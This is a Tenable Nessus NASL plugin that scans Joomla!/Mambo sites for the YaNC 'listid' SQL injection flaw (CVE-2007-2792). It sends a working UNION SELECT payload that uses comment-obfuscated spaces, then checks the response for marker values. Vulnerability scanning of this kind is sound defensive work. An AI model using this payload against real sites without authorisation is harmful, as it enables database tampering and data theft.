#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25243);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2007-2792");
  script_bugtraq_id(24030);
  script_osvdb_id(37948);
  script_xref(name:"EDB-ID", value:"3944");

  script_name(english:"YaNC Component for Joomla! 'listid' Parameter SQLi");
  script_summary(english:"Attempts to use a SQL injection to manipulate a newsletter overview.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the YaNC component for Joomla! and Mambo running on the
remote host is affected by a SQL injection vulnerability in the
components/com_yanc/yanc.html.php script due to improper sanitization
of user-supplied input to the 'listid' parameter before using it to
construct database queries in the showPageHeader() function.
Regardless of the PHP 'magic_quotes_gpc' setting, an unauthenticated,
remote attacker can exploit this issue to manipulate database queries,
resulting in disclosure of sensitive information, modification of
data, or other attacks against the underlying database.");
  # https://web.archive.org/web/20140728153334/http://forum.joomla-addons.org/index.php?topic=1216.0
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?87bc31f2");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.0.10 or later along with YaNC 1.4 RC1 or
later. Alternatively, edit the source as described in the author's
advisory referenced above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/05/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/05/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
app = "Mambo / Joomla!";

# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item("www/" +port+ "/mambo_mos");
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
joomla_installs = get_installs(
  app_name : "Joomla!",
  port     : port
);

if (joomla_installs[0] == IF_OK)
{
  foreach install (joomla_installs[1])
  {
    dir = install['path'];
    dirs[ndirs++] = dir;
  }
}

if (max_index(dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, app, port);

# Make sure component is installed first
plugin = "YaNc";
new_dirs = make_list();

foreach dir (dirs)
{
  # Check KB first
  installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

  if (!installed)
  {
    checks = make_array();
    regexes = make_list();
    regexes[0] = make_list('<name>YaNC<');
    checks["/administrator/components/com_yanc/yanc.xml"] = regexes;

    # Ensure plugin is installed
    installed = check_webapp_ext(
      checks : checks,
      dir    : dir,
      port   : port,
      ext    : plugin
    );
    if (installed) new_dirs = make_list(new_dirs, dir);
  }
}

info = "";
magic1 = unixtime();
magic2 = rand();
non_affect = make_list();
vuln = FALSE;

# Loop through each directory.
foreach dir (new_dirs)
{
  # Try to exploit the flaw to manipulate a newsletter overview.
  exploit = "9999999 UNION SELECT " +magic1+ "," +magic2+ "--";
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  url = dir + "/index.php?option=com_yanc&Itemid=9999999&listid=" + exploit;

  r = http_send_recv3(
    method : "GET",
    port   : port,
    item   : url,
    exit_on_fail : TRUE
  );
  # There's a problem if we managed to set the title based on our magic.
  if (
    '<td class="contentheading">' +magic1+ "</" >< r[2] &&
    ': ' +magic2+ "</" >< r[2]
  )
  {
    info += "  " + build_url(qs:url, port:port) + '\n';
    output = strstr(r[2], magic1);
    if (empty_or_null(output)) output = r[2];
    vuln = TRUE;
  }
  non_affect = make_list(non_affect, dir);
  if (!thorough_tests) break;
}

if (vuln)
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    sqli        : TRUE,
    generic     : TRUE,
    request     : split(info),
    output      : chomp(output)
  );
  exit(0);
}
else
{
  installs = max_index(non_affect);
  if (installs == 0)
    exit(0, "None of the "+app+ " installs (" + join(dirs, sep:" & ") + ") on port " + port+ " contain the " + plugin+ " component.");

  else if (installs == 1)
    audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, build_url(qs:dir, port:port), plugin + " component");

  else exit(0, "None of the "+app+ " installs with the " + plugin+ " component (" + join(non_affect, sep:" & ") + ") on port " + port + " are affected.");
}

